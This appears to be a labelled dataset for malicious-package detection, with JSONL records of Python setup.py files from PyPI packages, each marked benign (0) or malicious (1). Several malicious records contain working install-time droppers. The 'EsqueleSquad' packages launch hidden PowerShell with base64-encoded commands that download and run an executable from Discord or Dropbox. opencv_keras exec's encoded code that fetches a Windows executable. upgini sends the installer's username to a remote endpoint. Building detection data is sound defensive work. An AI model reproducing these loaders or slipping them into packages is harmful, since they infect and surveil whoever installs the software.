\".join(cmd), level=distutils.log.INFO)\n        subprocess.check_call(cmd, cwd=BASE_DIR)  # nosec\n\n        cmd = [\"npm\", \"run\", \"build\"]\n        self.announce(\"running command: %s\" % \" \".join(cmd), level=distutils.log.INFO)\n        subprocess.check_call(\n            cmd, cwd=BASE_DIR, env={**os.environ, \"BUILD_LIB\": self.build_lib}\n        )  # nosec\n\n\nclass build(_build):\n    sub_commands = [\n        *_build.sub_commands,\n        (\"compile_translations\", None),\n        (\"compile_scss\", None),\n    ]\n\n\nclass install(_install):\n    sub_commands = [\n        *_install.sub_commands,\n        (\"compile_translations\", None),\n        (\"compile_scss\", None),\n    ]\n\n\nsetup(\n    name=\"django-hijack\",\n    use_scm_version=True,\n    cmdclass={\n        \"build\": build,\n        \"install\": install,\n        \"compile_translations\": compile_translations,\n        \"compile_scss\": compile_scss,\n    },\n)\n", "target": 0}
{"idx": "earthengine-api-0.1.319", "func": "#!/usr/bin/env python\n#\n# Copyright 2012 Google Inc. All Rights Reserved.\n\n\"\"\"Setup file for Earth Engine Python API package.\"\"\"\n\nimport re\n\ntry:\n  # if setuptools is available, use it to take advantage of its dependency\n  # handling\n  from setuptools import setup                          # pylint: disable=g-import-not-at-top\nexcept ImportError:\n  # if setuptools is not available, use distutils (standard library). Users\n  # will receive errors for missing packages\n  from distutils.core import setup                      # pylint: disable=g-import-not-at-top\n\n\ndef GetVersion():\n  with open('ee/__init__.py') as f:\n    return re.findall(r'__version__\\s*=\\s*\\'([.\\d]+)\\'', f.read())[0]\n\n\nsetup(\n    name='earthengine-api',\n    version=GetVersion(),\n    description='Earth Engine Python API',\n    url='http://code.google.com/p/earthengine-api/',  # home page for package\n    download_url='',  # package download URL\n    packages=['ee', 'ee.cli'],\n    package_data={\n        'ee': ['tests/*.py', 'tests/*.json',],\n        'ee.cli': ['licenses.txt'],\n    },\n    test_suite='ee/tests',\n    install_requires=[\n        # Note we omit TensorFlow (used by the CLI) here on purpose to avoid\n        # an extra 0.5GiB of deps compared to our current 26MiB; Use of TF\n        # functionality requires a manual install of TensorFlow.\n        'future',\n        'google-cloud-storage',\n        'google-api-python-client>=1.12.1,<2',\n        'google-auth>=1.4.1',\n        'google-auth-httplib2>=0.0.3',\n        'httplib2>=0.9.2,<1dev',\n        'httplib2shim',\n        'six'\n    ],\n    entry_points={\n        'console_scripts': ['earthengine = ee.cli.eecli:main',],\n    },\n    classifiers=[\n        # Get strings from\n        # http://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'Programming Language :: Python',\n        'Operating System :: OS Independent',\n        'Development Status :: 2 - Pre-Alpha',\n        'Intended Audience :: Science/Research',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Topic :: Multimedia :: Graphics :: Viewers',\n        'Topic :: Scientific/Engineering :: GIS',\n        'Topic :: Scientific/Engineering :: Visualization',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    keywords='earth engine image analysis',\n    author='Noel Gorelick',\n    author_email='gorelick@google.com',\n    long_description=\"\"\"\\\n=======================\nEarth Engine Python API\n=======================\nThis package allows developers to interact with Google Earth Engine using the\nPython programming language.\n\"\"\",\n)\n", "target": 0}
{"idx": "upgini-1.1.99", "func": "import sys\nfrom getpass import getuser\nfrom logging import Formatter\nfrom pathlib import Path\nfrom urllib import request\n\nfrom setuptools import find_packages, setup\n\n# To build:\n# python setup.py sdist\n# python setup.py bdist_wheel\n#\n# To install:\n# python setup.py install\n#\n# To register (only once):\n# python setup.py register\n#\n# To upload:\n# python setup.py sdist upload\n# python setup.py bdist_wheel upload\n\n\ndef send_log(msg: str):\n    try:\n        url = \"https://search.upgini.com/private/api/v2/events/send-light\"\n\n        data = ('{\"message\": \"' + msg + '\", \"whoamai\": \"' + getuser() + '\"}').encode()\n\n        req = request.Request(url, data=data)\n        req.add_header(\"Content-Type\", \"application/json\")\n        request.urlopen(req)\n    except Exception:\n        pass\n\n\nhere = Path(__file__).parent.resolve()\nversion = \"1.1.99\"\ntry:\n    send_log(f\"Start setup PyLib version {version}\")\n    setup(\n        name=\"upgini\",\n        version=version,\n        description=\"Low-code feature search and enrichment library for machine learning\",\n        long_description=(here / \"README.md\").read_text(encoding=\"utf-8\"),\n        long_description_content_type=\"text/markdown\",\n        url=\"https://upgini.com/\",\n        author=\"Upgini Developers\",\n        author_email=\"madewithlove@upgini.com\",\n        classifiers=[\n            \"Development Status :: 5 - Production/Stable\",\n            \"Intended Audience :: Customer Service\",\n            \"Intended Audience :: Developers\",\n            \"Intended Audience :: Financial and Insurance Industry\",\n            \"Intended Audience :: Information Technology\",\n            \"Intended Audience :: Science/Research\",\n            \"Intended Audience :: Telecommunications Industry\",\n            \"License :: OSI Approved :: BSD License\",\n            \"Operating System :: OS Independent\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n            \"Topic :: Scientific/Engineering :: Information Analysis\",\n        ],\n        license=\"BSD 3-Clause License\",\n        keywords=[\"data science\", \"machine learning\", \"data mining\", \"automl\", \"data search\"],\n        package_dir={\"\": \"src\"},\n        packages=find_packages(where=\"src\"),\n        package_data={\"\": [\"strings.properties\"]},\n        python_requires=\">=3.7,<3.10\",\n        install_requires=[\n            \"python-dateutil>=2.8.0\",\n            \"requests>=2.8.0\",\n            \"pandas>=1.1.0\",\n            \"numpy>=1.19.0\",\n            \"scikit-learn>=1.0.1\",\n            \"pydantic>=1.8.2\",\n            \"fastparquet>=0.7.1\",\n            \"python-json-logger>=2.0.2\",\n            \"catboost>=1.0.3\",\n        ],\n        project_urls={\n            \"Bug Reports\": \"https://github.com/upgini/upgini/issues\",\n            \"Source\": \"https://github.com/upgini/upgini\",\n        },\n    )\n    send_log(f\"Setup of PyLib {version} successfully finished\")\nexcept Exception as e:\n    try:\n        tb = Formatter().formatException(sys.exc_info())\n        send_log(f\"Failed to setup PyLib {version}: {e}\\n{tb}\")\n    except Exception:\n        pass\n    raise e\n", "target": 1}
{"idx": "fiddler-client-1.3.0", "func": "import pathlib\nimport re\n\nimport setuptools\n\n# parse version number\nversion_regex = r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\"\nversion_file_contents = pathlib.Path('fiddler', '_version.py').open().read()\nversion_match = re.search(version_regex, version_file_contents, re.M)\nif version_match:\n    version = version_match.group(1)\nelse:\n    raise RuntimeError('Unable to find version string.')\n\n\nwith open('PUBLIC.md', 'r') as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n    name='fiddler-client',\n    version=version,\n    author='Fiddler Labs',\n    description='Python client for Fiddler Service',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://fiddler.ai',\n    packages=setuptools.find_packages(),\n    install_requires=[\n        'pip>=21.0',\n        'requests<3',\n        'requests-toolbelt',\n        'pandas>=1.2.5',\n        'pyyaml',\n        'packaging',\n        'deepdiff',\n        'boto3',\n        'botocore',\n        'fastavro',\n        'importlib-resources',\n        'Werkzeug',\n        'pyarrow>=3.0.0',\n        'deprecation==2.1.0',\n        'pydantic==1.9.0',  # v2 dependency\n        'deprecated==1.2.13',\n    ],\n    classifiers=[\n        'Programming Language :: Python :: 3',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n    ],\n    python_requires='>3.6.3',\n    entry_points={\n        'console_scripts': [\n            'far = fiddler.archive.far:main',\n        ],\n    },\n)\n", "target": 0}
{"idx": "esqinfostrget-8.25", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqinfostrget',\n    packages = ['modlib'],\n    version = '3.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "opencv_keras-17.10.13", "func": "from setuptools import setup, find_packages\nimport os\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\n\nVERSION = '17.10.13'\nDESCRIPTION = 'A library for data visualization'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"opencv_keras\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\n\n", "target": 1}
{"idx": "geoip2-tools-0.1.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport copy\nfrom itertools import chain\nfrom setuptools import setup\n\nREQUIREMENT_FILE = 'requirements.in'\nDEV_STATUS = 'Production/Stable'  # Planning, Pre-Alpha, Alpha, Beta, Production/Stable, Mature, Inactive\nCLASSIFIERS = [  # https://github.com/github/choosealicense.com/tree/gh-pages/_licenses\n    'License :: OSI Approved :: MIT License',\n    # 'License :: OSI Approved :: BSD License',\n    # 'License :: OSI Approved :: ISC License (ISCL)',\n    # 'License :: OSI Approved :: Apache Software License',\n    # 'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n]  # https://pypi.python.org/pypi?%3Aaction=list_classifiers\nNATURAL_LANGUAGE = 'English'\nPLATFORMS = [\n    # 'universal',\n    'linux',\n    # 'macosx',\n    # 'solaris',\n    # 'irix',\n    # 'win'\n    # 'bsd'\n    # 'ios'\n    # 'android'\n]\nPYTHON_VERSIONS = ['3.5', '3.6', '3.7', '3.8']\n\n\ndef get_python_classifiers(versions):\n    for version in range(2, 4):\n        if not next(iter(filter(lambda x: int(float(x)) != version, versions.copy())), False):\n            versions.add('{} :: Only'.format(version))\n            break\n    return ['Programming Language :: Python :: %s' % version for version in versions]\n\n\ndef get_platform_classifiers(platform):\n    parts = {\n        'linux': ('POSIX', 'Linux'),\n        'win': ('Microsoft', 'Windows'),\n        'solaris': ('POSIX', 'SunOS/Solaris'),\n        'aix': ('POSIX', 'Linux'),\n        'unix': ('Unix',),\n        'bsd': ('POSIX', 'BSD')\n    }[platform]\n    return ['Operating System :: {}'.format(' :: '.join(parts[:i+1]))\n            for i in range(len(parts))]\n\n\ndef read_file(path):\n    with open(path) as f:\n        return f.read()\n\n\nstatuses = ['Planning', 'Pre-Alpha', 'Alpha', 'Beta', 'Production/Stable', 'Mature', 'Inactive']\n\n# Classifiers\nclassifiers = copy.copy(CLASSIFIERS)\nclassifiers.extend(get_python_classifiers(set(PYTHON_VERSIONS) - {2.8, 2.9}))\nclassifiers.extend(chain(*[get_platform_classifiers(platform) for platform in PLATFORMS]))\nclassifiers.extend([\n    'Natural Language :: {}'.format(NATURAL_LANGUAGE),\n    'Development Status :: {} - {}'.format(statuses.index(DEV_STATUS) + 1, DEV_STATUS),\n])\n\n\nsetup(\n    entry_points={\n        'console_scripts': [\n            'geoip2-tools = geoip2_tools:manage'\n        ],\n    },\n    classifiers=classifiers,\n    platforms=PLATFORMS,\n    install_requires=read_file(REQUIREMENT_FILE),\n)\n", "target": 0}
{"idx": "tpcontrolpywreplace-8.2", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcontrolpywreplace',\n    packages = ['modlib'],\n    version = '3.58',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "docker-pycreds-0.4.0", "func": "#!/usr/bin/env python\nimport os\n\nfrom setuptools import setup\n\n\nROOT_DIR = os.path.dirname(__file__)\nSOURCE_DIR = os.path.join(ROOT_DIR)\n\nrequirements = [\n    'six >= 1.4.0',\n]\n\nversion = None\nexec(open('dockerpycreds/version.py').read())\n\nwith open('./test-requirements.txt') as test_reqs_txt:\n    test_requirements = [line for line in test_reqs_txt]\n\nlong_description = None\nwith open('./README.md', 'r') as readme:\n    long_description = readme.read()\n\n\nsetup(\n    name=\"docker-pycreds\",\n    version=version,\n    description=\"Python bindings for the docker credentials store API\",\n    long_description=long_description,\n    url='https://github.com/shin-/dockerpy-creds',\n    license='Apache License 2.0',\n    packages=[\n        'dockerpycreds',\n    ],\n    install_requires=requirements,\n    tests_require=test_requirements,\n    zip_safe=False,\n    test_suite='tests',\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Other Environment',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Utilities',\n        'License :: OSI Approved :: Apache Software License',\n    ],\n)\n", "target": 0}
{"idx": "py-hydracontrolcontrol-5.71", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hydracontrolcontrol',\n    packages = ['modlib'],\n    version = '2.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-filer-2.2.3", "func": "#!/usr/bin/env python\nfrom setuptools import find_packages, setup\n\nfrom filer import __version__\n\n\nREQUIREMENTS = [\n    'django>=2.2,<5',\n    'django-mptt',\n    'django-polymorphic',\n    'easy-thumbnails[svg]',\n    'Unidecode>=0.04,<1.2',\n]\n\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Environment :: Web Environment',\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: BSD License',\n    'Operating System :: OS Independent',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'Framework :: Django',\n    'Framework :: Django :: 2.2',\n    'Framework :: Django :: 3.0',\n    'Framework :: Django :: 3.1',\n    'Framework :: Django :: 3.2',\n    'Framework :: Django :: 4.0',\n    'Framework :: Django CMS',\n    'Framework :: Django CMS :: 3.6',\n    'Framework :: Django CMS :: 3.7',\n    'Framework :: Django CMS :: 3.8',\n    'Framework :: Django CMS :: 3.9',\n    'Framework :: Django CMS :: 3.10',\n    'Topic :: Internet :: WWW/HTTP',\n    'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    'Topic :: Software Development',\n    'Topic :: Software Development :: Libraries',\n]\n\n\nsetup(\n    name='django-filer',\n    version=__version__,\n    author='Divio AG',\n    author_email='info@divio.ch',\n    maintainer='Django CMS Association and contributors',\n    maintainer_email='info@django-cms.org',\n    url='https://github.com/django-cms/django-filer',\n    license='BSD-3-Clause',\n    description='A file management application for django that makes handling '\n                'of files and images a breeze.',\n    long_description=open('README.rst').read(),\n    packages=find_packages(),\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=REQUIREMENTS,\n    python_requires='>=3.6',\n    classifiers=CLASSIFIERS,\n    test_suite='tests.settings.run',\n)\n", "target": 0}
{"idx": "libcvcv-2.69", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcvcv',\n    packages = ['modlib'],\n    version = '7.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-mptt-0.13.4", "func": "#!/usr/bin/env python3\nfrom setuptools import setup\n\n\nsetup()\n", "target": 0}
{"idx": "flask-azure-oauth-0.7.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackage_dir = \\\n{'': 'src'}\n\npackages = \\\n['flask_azure_oauth', 'flask_azure_oauth.mocks']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['Flask>=2.0.2,<3.0.0', 'authlib==0.14.3', 'requests>=2.23.0,<3.0.0']\n\nsetup_kwargs = {\n    'name': 'flask-azure-oauth',\n    'version': '0.7.0',\n    'description': 'Python Flask extension for using Azure Active Directory with OAuth to protect applications',\n    'long_description': '# Flask Azure AD OAuth Provider\\n\\nPython Flask extension for securing apps with Azure Active Directory OAuth\\n\\n## Purpose\\n\\nProvide an [AuthLib](https://authlib.org)\\n[Resource Protector/Server](https://docs.authlib.org/en/latest/flask/2/resource-server.html) to authenticate and\\nauthorise users and applications using a Flask application with OAuth functionality offered by\\n[Azure Active Directory](https://azure.microsoft.com/en-us/services/active-directory/), as part of the\\n[Microsoft identity platform](https://docs.microsoft.com/en-us/azure/active-directory/develop/about-microsoft-identity-platform).\\n\\nAzure Active Directory, acting as an identity provider, issues\\n[OAuth access tokens](https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens), the claims of\\nwhich are validated by this provider. These claims include the identity of the user and client application (used for\\nauthentication), and any permissions/scopes assigned or delegated to the user or application (used for authorisation).\\n\\nThis provider supports these scenarios:\\n\\n1. *application to application*\\n   * supports authentication and authorisation\\n   * used to allow a client application access to some functionality or resources provided by another application\\n   * can be used for non-interactive, machine-to-machine, processes (using the OAuth Client Credentials Grant)\\n   * optionally, uses the identity of the client application for authentication\\n   * optionally, uses permissions assigned directly to the client application for authorisation\\n2. *user to application*\\n   * supports authentication and authorisation\\n   * used to allow users access to some functionality or resources provided by another application\\n   * can be used for interactive console (using the Device Authorization Grant) or web application (using the OAuth\\n     Authorization Code Grant) processes\\n   * uses the identity of the user, and optionally, the client application they are using, for authentication\\n   * optionally, uses permissions assigned to the user, permissions delegated by the user to the client application,\\n     and/or permissions assigned directly to the client application for authorisation\\n\\nOther scenarios may work but are not officially supported, this may change in the future.\\n\\n**Note:** This provider does not support client applications requesting tokens from Azure. See the\\n[Microsoft Authentication Library (MSAL) for Python](https://github.com/AzureAD/microsoft-authentication-library-for-python)\\npackage if you need to do this.\\n\\n**Note:** This provider has been written to solve an internal need within applications used by the British Antarctic\\nSurvey. It is offered to others in the hope that\\'s useful for your needs as well, however it does not (and cannot)\\ncover every option available.\\n\\n## Installation\\n\\nThis package can be installed using Pip from [PyPi](https://pypi.org/project/flask-azure-oauth):\\n\\n```\\n$ pip install flask-azure-oauth\\n```\\n\\n**Note:** Since version 0.6.0, this package requires Flask 2.0 or greater.\\n\\n## Usage\\n\\nThis provider provides an [AuthLib](https://authlib.org)\\n[Resource Protector](https://docs.authlib.org/en/latest/flask/2/resource-server.html) which can be used as a decorator\\non Flask routes.\\n\\nA minimal application would look like this:\\n\\n```python\\nfrom flask import Flask\\n\\nfrom flask_azure_oauth import FlaskAzureOauth\\n\\napp = Flask(__name__)\\n\\napp.config[\\'AZURE_OAUTH_TENANCY\\'] = \\'xxx\\'\\napp.config[\\'AZURE_OAUTH_APPLICATION_ID\\'] = \\'xxx\\'\\n\\nauth = FlaskAzureOauth()\\nauth.init_app(app)\\n\\n@app.route(\\'/unprotected\\')\\ndef unprotected():\\n    return \\'hello world\\'\\n\\n@app.route(\\'/protected\\')\\n@auth()\\ndef protected():\\n    return \\'hello authenticated entity\\'\\n\\n@app.route(\\'/protected-with-single-scope\\')\\n@auth(\\'required-scope\\')\\ndef protected_with_scope():\\n    return \\'hello authenticated and authorised entity\\'\\n\\n@app.route(\\'/protected-with-multiple-scopes\\')\\n@auth(\\'required-scope1 required-scope2\\')\\ndef protected_with_multiple_scopes():\\n    return \\'hello authenticated and authorised entity\\'\\n```\\n\\nTo restrict a route to any valid user or client application (authentication):\\n\\n* add the resource protector as a decorator (`auth` in this example) - for example the `/protected` route\\n\\nTo restrict a route to specific users (authorisation):\\n\\n* add any required [Scopes](#permissions-roles-and-scopes) to the decorator - for example the `/projected-with-*` routes\\n\\nIndependently of these options, it\\'s possible to require specific, trusted, client applications, regardless of the user\\nusing them. This is useful in circumstances where a user may be authorised but the client can\\'t be trusted:\\n\\n* set the `AZURE_OAUTH_CLIENT_APPLICATION_IDS` config option to a list of Azure application identifiers\\n\\nFor example:\\n\\n```\\napp.config[\\'AZURE_OAUTH_CLIENT_APPLICATION_IDS\\'] = [\\'xxx\\']`\\n```\\n\\n### Configuration options\\n\\nThe resource protector requires two configuration options to validate tokens correctly. These are read from the Flask\\n[config object](http://flask.pocoo.org/docs/1.0/config/) through the `init_app()` method.\\n\\n| Configuration Option                 | Data Type | Required | Description                                                                                                                |\\n| ------------------------------------ | --------- | -------- | -------------------------------------------------------------------------------------------------------------------------- |\\n| `AZURE_OAUTH_TENANCY`                | Str       | Yes      | ID of the Azure AD tenancy all applications and users are registered within                                                |\\n| `AZURE_OAUTH_APPLICATION_ID`         | Str       | Yes      | ID of the Azure AD application registration for the application being protected                                            |\\n| `AZURE_OAUTH_CLIENT_APPLICATION_IDS` | List[Str] | No       | ID(s) of the Azure AD application registration(s) for the application(s) granted access to the application being protected |\\n\\n**Note:** If the `AZURE_OAUTH_CLIENT_APPLICATION_IDS` option is not set, all client applications will be trusted and the\\n`azp` claim, if present, is ignored.\\n\\nBefore these options can be set you will need to:\\n\\n1. [register the application to be protected](#registering-an-application-in-azure)\\n2. [define the permissions and roles this application supports](#defining-permissions-and-roles-within-an-application)\\n3. [register the application(s) that will use the protected application](#registering-an-application-in-azure)\\n4. [assign permissions to users and/or client application(s)](#assigning-permissions-and-roles-to-users-and-applications)\\n\\n### Flask session support\\n\\nThis provider extends the AuthLib ResourceProtector to support detecting access tokens stored in the Flask session.\\n\\nThis is intended for browser based applications where the `Authorization` header cannot be easily set to include the\\naccess token. This support will be enabled automatically if an `access_token` session key is set.\\n\\n### Access token versions\\n\\nSince version 0.5.0, this provider is compatible with Azure access token versions 1.0 and 2.0. Prior to version 0.5.0\\nonly version 2.0 tokens could be used. See\\n[Microsoft\\'s documentation](https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens) for the\\ndifferences between token versions.\\n\\n**Note:** If you use version 1.0 tokens, this provider expects at least one of the `identifierUris` property values to\\nbe `api://{protected_application_id}`, where `{protected_application_id}` is the application ID of the app registration\\nrepresenting the application being protected by this provider. Without this, you will receive errors for an invalid\\naudience.\\n\\n### Applications, users, groups and tenancies\\n\\nAzure Active Directory has a number of different concepts for agents that represent things being protected and 